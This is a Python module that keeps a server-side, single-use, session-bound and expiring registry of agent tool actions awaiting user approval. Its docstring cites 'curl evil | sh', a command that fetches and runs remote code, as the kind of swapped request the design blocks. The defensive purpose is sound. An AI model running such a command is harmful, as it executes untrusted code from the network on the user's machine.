"""Server-side registry of actions waiting for the user's approval.

The agent cannot run a dangerous tool when safe mode is on: it emits an
``approval`` event instead and registers the exact ``(name, args)`` here. The
browser then POSTs the id back, and only *that stored* action runs.

What that buys, compared with trusting the browser's copy of the request:

* **The args are the server's own.** A client cannot swap
  ``{"command": "ls"}`` for ``{"command": "curl evil | sh"}`` between the card
  appearing and the click.
* **Single use.** Redeeming removes the entry, so a replayed POST (or the model
  re-requesting the same action after the turn resumed) cannot run it twice.
* **Token-bound.** Each entry is only redeemable by the session that received
  it, so another client on the same machine cannot claim it.
* **Expires.** A stale card cannot be redeemed half an hour later.

In-memory by design: an approval prompt that outlives the process is not an
approval prompt, it is a permission slip.
"""

from __future__ import annotations

import itertools
import secrets
import threading
import time
from dataclasses import dataclass
from typing import Any

APPROVAL_TTL_SECONDS = float(300)  # 5 minutes to click a card
MAX_PENDING = 64                   # bound the memory a stalled session can use


@dataclass(frozen=True)
class PendingApproval:
    id: str
    name: str
    args: dict[str, Any]
    description: str
    session: str          # hash of the token that was shown the card
    created: float


@dataclass(frozen=True)
class ExecutedApproval:
    """An approval that has run, waiting to be folded back into the turn."""
    id: str
    name: str
    args: dict[str, Any]
    description: str
    result: dict[str, Any]
    session: str
    created: float = 0.0


_lock = threading.Lock()
_pending: dict[str, PendingApproval] = {}
_executed: dict[str, ExecutedApproval] = {}
_counter = itertools.count(1)


def _session_fingerprint(token: str) -> str:
    # Not a secret in itself; just enough to bind a card to one session.
    import hashlib

    return hashlib.sha256(("aegis-approval:" + token).encode()).hexdigest()[:16]


def _prune(now: float) -> None:
    for key, item in list(_pending.items()):
        if now - item.created > APPROVAL_TTL_SECONDS:
            _pending.pop(key, None)
    # An executed-but-unclaimed result is only useful for the next turn.
    for key, item in list(_executed.items()):
        if now - item.created > APPROVAL_TTL_SECONDS:
            _executed.pop(key, None)
    while len(_executed) > MAX_PENDING:
        _executed.pop(next(iter(_executed)), None)


def register(name: str, args: dict[str, Any], description: str, session_token: str) -> PendingApproval:
    """Record an action awaiting approval and return it (with its id)."""
    now = time.time()
    with _lock:
        _prune(now)
        if len(_pending) >= MAX_PENDING:
            oldest = min(_pending.values(), key=lambda p: p.created)
            _pending.pop(oldest.id, None)
        item = PendingApproval(
            id=f"ap-{next(_counter)}-{secrets.token_urlsafe(6)}",
            name=name,
            args=dict(args or {}),
            description=description,
            session=_session_fingerprint(session_token),
            created=now,
        )
        _pending[item.id] = item
        return item


def redeem(approval_id: str, session_token: str) -> tuple[PendingApproval | None, str | None]:
    """Consume an approval. Returns ``(item, None)`` or ``(None, reason)``."""
    now = time.time()
    with _lock:
        _prune(now)
        item = _pending.get(approval_id)
        if item is None:
            return None, "That approval has expired, was already used, or was never issued."
        if item.session != _session_fingerprint(session_token):
            return None, "That approval belongs to a different session."
        _pending.pop(approval_id, None)
        return item, None


def complete(
    approval_id: str,
    session_token: str,
    name: str,
    args: dict[str, Any],
    description: str,
    result: dict[str, Any],
) -> None:
    """Record that an approval has run, so the turn can be resumed with it.

    The result is stored, not the right to run again: claiming it never
    executes anything, which is what keeps "approve" to exactly one execution.
    """
    session = _session_fingerprint(session_token)
    with _lock:
        _executed[approval_id] = ExecutedApproval(
            id=approval_id,
            name=name,
            args=dict(args or {}),
            description=description,
            result=dict(result or {}),
            session=session,
            created=time.time(),
        )


def claim_result(approval_id: str, session_token: str) -> tuple[ExecutedApproval | None, str | None]:
    """Take the stored outcome of an approval that already ran (once)."""
    session = _session_fingerprint(session_token)
    with _lock:
        item = _executed.get(approval_id)
        if item is None:
            return None, None  # not executed yet — the caller may run it
        if item.session != session:
            return None, "That approval belongs to a different session."
        _executed.pop(approval_id, None)
        return item, None


def forget_all() -> None:
    """Drop every outstanding approval (used by tests)."""
    with _lock:
        _pending.clear()
        _executed.clear()


def pending_count() -> int:
    with _lock:
        _prune(time.time())
        return len(_pending)
